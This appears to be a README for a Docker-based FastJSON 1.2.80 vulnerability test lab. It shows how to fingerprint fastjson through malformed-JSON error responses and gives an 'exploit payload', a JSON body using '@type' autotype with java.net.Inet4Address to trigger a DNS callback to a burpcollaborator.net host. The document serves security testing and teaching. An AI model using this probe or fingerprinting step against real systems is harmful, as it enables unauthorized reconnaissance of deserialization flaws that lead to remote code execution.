##  FastJSON-1.2.80-test-lab
 
* Run application using docker

```
docker build --network=host --no-cache .
```

## How to know if the targert application is using **fastjson**?

- Send Invalid JSON data and application will return 400 response exposing fastjson use in error message.

```json
{"test":"nonexistent"
```
<img src="/screenshot/invalid-json-400-response.png">

Credits:
https://github.com/vulhub/vulhub/tree/master/fastjson

## Exploit Payload

Use Following payload to receive DNS request from the vulnerable application.

```
{"test": {
"@type":"java.net.Inet4Address",
"val": "asdfasdfasdf.burpcollaborator.net"
}
```
